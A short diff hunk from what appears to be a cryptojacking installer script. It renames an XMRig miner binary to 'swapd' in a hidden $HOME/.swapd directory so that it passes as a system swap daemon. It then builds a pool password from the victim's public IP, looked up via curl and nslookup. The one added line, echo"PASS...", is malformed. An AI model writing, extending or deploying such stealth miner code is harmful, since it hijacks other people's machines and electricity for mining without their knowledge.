@@ -244,6 +244,7 @@ echo "[*] Miner $HOME/.swapd/xmrig is OK"
 echo "mv $HOME/.swapd/xmrig $HOME/.swapd/swapd"
 mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 
+echo"PASS..."
 #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS=`hostname`
 PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
